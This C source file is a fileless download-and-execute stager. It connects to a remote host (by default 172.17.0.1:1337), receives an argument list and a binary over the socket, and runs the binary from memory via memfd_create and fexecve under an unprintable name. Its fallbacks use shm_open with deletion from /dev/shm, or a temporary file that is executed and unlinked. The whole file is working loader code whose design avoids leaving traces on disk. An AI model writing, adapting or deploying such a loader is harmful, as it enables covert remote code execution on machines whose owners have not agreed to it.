#include <fcntl.h> 
#include <stdio.h> 
#include <stdlib.h> 
#include <sys/mman.h> 
#include <sys/stat.h> 
#include <unistd.h> 
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <errno.h>

#ifdef __linux__
#define HAVE_MEMFD
#define NO_FALLBACK
#define USE_FORK
#endif

#ifdef __VMS_VER
#define USE_VFORK
#endif


#if !defined(USE_FORK) && !defined(USE_VFORK)
#error Dunno which fork to use
#endif


#ifdef HAVE_MEMFD

#include <sys/syscall.h>
#include <linux/memfd.h>

/*
 * No glibc wrappers exist for memfd_create(2), so provide our own.
 *
 * Also define memfd fcntl sealing macros. While they are already
 * defined in the kernel header file <linux/fcntl.h>, that file as
 * a whole conflicts with the original glibc header <fnctl.h>.
 */

static inline int memfd_create(const char *name, unsigned int flags) {
    return syscall(__NR_memfd_create, name, flags);
}

#ifndef F_LINUX_SPECIFIC_BASE
#define F_LINUX_SPECIFIC_BASE 1024
#endif

#ifndef F_ADD_SEALS
#define F_ADD_SEALS (F_LINUX_SPECIFIC_BASE + 9)
#define F_GET_SEALS (F_LINUX_SPECIFIC_BASE + 10)

#define F_SEAL_SEAL     0x0001  /* prevent further seals from being set */
#define F_SEAL_SHRINK   0x0002  /* prevent file from shrinking */
#define F_SEAL_GROW     0x0004  /* prevent file from growing */
#define F_SEAL_WRITE    0x0008  /* prevent writes */
#endif

#endif


extern char **environ;


static int
sock_connect( const char *ip, int port ) {
    struct sockaddr_in serv_addr; 
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if( sockfd < 0 )
        return sockfd;

    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);

    // XXX: only IPv4 compatible
    serv_addr.sin_addr.s_addr = inet_addr(ip);
    if( serv_addr.sin_addr.s_addr == INADDR_NONE ) {
        return -1;
    }

    /*
    if( inet_pton(AF_INET, ip, &serv_addr.sin_addr) <= 0 ) {
        return -1;
    }
    */

    if( connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0 ) {
        return -2;
    }

    return sockfd;
}


static unsigned int
sock_readbytes( int sockfd, char *buf, unsigned int nbytes ) {
    int rc;
    unsigned int nbread = 0;
    while( nbread < nbytes ) { 
        rc = read(sockfd, buf, nbytes - nbread); 
        if (rc < 0) {         
            return 0;
        }
        buf += rc;
        nbread += rc;
    }
    return nbread;
}


static unsigned int
sock_readint( int sockfd ) {
    unsigned int ret = 0;
    if( sock_readbytes(sockfd, (void*)&ret, 4) != 4 ) {
        return 0;
    }
    return ntohl(ret);
}


static char **
sock_argv( int sockfd ) {
    char *data = NULL;
    char *bufstart;
    int nbytes = sock_readint(sockfd);
    if( ! nbytes ) {
        printf("Error reading nbytes\n");
        return NULL;
    }

    unsigned int nargs = sock_readint(sockfd);
    if( ! nargs ) {
        printf("Error reading nargs\n");
        return NULL;
    }    

    unsigned int args_sz = nargs * sizeof(char*);
    data = malloc(args_sz + nbytes );
    if( ! data )
        return NULL;

    char **args = (char**)&data[0];
    bufstart = &data[args_sz];
    while( nargs-- ) {        
        unsigned int val = sock_readint(sockfd);
        if( val ) {
            args[nargs] = &bufstart[val];
        }
        else {
            args[nargs] = NULL;
        }
    }

    if( ! sock_readbytes(sockfd, bufstart, nbytes) ) {
        free(data);
        return NULL;
    }

    return (char**)data;
}

#ifndef NO_FALLBACK

static int
sock_exec_fallback( int sockfd, unsigned int nbytes, char **argv ) {
    char *filename = tempnam(NULL, NULL);
    int outfd;
    char buf[1024];
    unsigned int nread;
    unsigned int ntoread;
    unsigned int nwritten;

    outfd = open(filename, O_CREAT|O_WRONLY, 0700);
    if( outfd == -1 ) {
        return 3;
    }

    while( nbytes ) {
        ntoread = (nbytes > sizeof(buf)) ? sizeof(buf) : nbytes;
        nread = sock_readbytes(sockfd, buf, ntoread);
        if( ! nread ) {
            return 4;
        }
        nwritten = write(outfd, buf, nread);
        if( nread != nwritten ) {
            return 5;
        }
        nbytes -= nwritten;
    }

    close(outfd);

    #ifdef USE_VFORK
    pid_t child_pid = vfork();
    #endif

    #ifdef USE_FORK
    pid_t child_pid = fork();
    #endif

    if( child_pid == 0 ) {
        if( -1 == execve(filename, argv, environ) ) {
            perror("execve");
            unlink(filename);
            return 6;
        }
    }
    else {
        sleep(1);
        unlink(filename);
    }

    return 7;
}

#else

static int
sock_exec_fallback( int sockfd, unsigned int nbytes, char **argv ) {
    return 3;
}

#endif


#ifdef HAVE_MEMFD

static int
sock_exec_impl( int sockfd, unsigned int nbytes, char **argv ) {
    char *ptr, *buf;
    int shm_fd, rc;
    int method = 0;

    shm_fd = memfd_create("\254", MFD_CLOEXEC); 
    if( shm_fd < 0 || errno == ENOSYS ) {
        method = 1;
        shm_fd = shm_open("\254", O_RDWR | O_CREAT, 0777); 
        if (shm_fd == -1) { 
            perror("shm_open"); 
            return sock_exec_fallback(sockfd, nbytes, argv);
        }
    }

    rc = ftruncate(shm_fd, nbytes); 
    if (rc == -1) {
        close(shm_fd);
        perror("ftruncate");
        return sock_exec_fallback(sockfd, nbytes, argv);
    }

    buf = ptr = (char *)mmap(NULL, nbytes, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0); 
    if (ptr == MAP_FAILED) { 
        perror("mmap");
        close(shm_fd);
        return sock_exec_fallback(sockfd, nbytes, argv);
    }

    sock_readbytes(sockfd, buf, nbytes);

    munmap(ptr, nbytes); 
    
    if( method == 1 ) {        
        close(shm_fd); 
        shm_fd = shm_open("\254", O_RDONLY, 0);
        remove("/dev/shm/\254");
    }

    fexecve(shm_fd, argv, environ); 
    perror("fexecve"); 
    return 6;
}

#else

#define sock_exec_impl sock_exec_fallback

#endif


static int
sock_exec( int sockfd )
{
    char **argv;
    unsigned int nbytes;

    argv = sock_argv(sockfd);
    if( ! argv ) {
        printf("Cannot read argv\n");
        return 1;
    }

    nbytes = sock_readint(sockfd);
    if( ! nbytes ) {
        printf("Cannot read bytes\n");
        return 2;
    }

    return sock_exec_impl(sockfd, nbytes, argv);
}


int
main( int argc, char **argv ) {
    const char *ip_addr = "172.17.0.1";
    int port = 1337;
    int rc = -1;
    if( argc > 1 ) {
        ip_addr = argv[1];
        if( argc > 2 ) {
            port = atoi(argv[2]);            
        }
    }

    int sockfd = sock_connect(ip_addr, port);
    if( sockfd < 0 ) {
        perror("sock_connect");
        return 2;
    }

    rc = sock_exec(sockfd);

    close(sockfd);
    return rc;
}

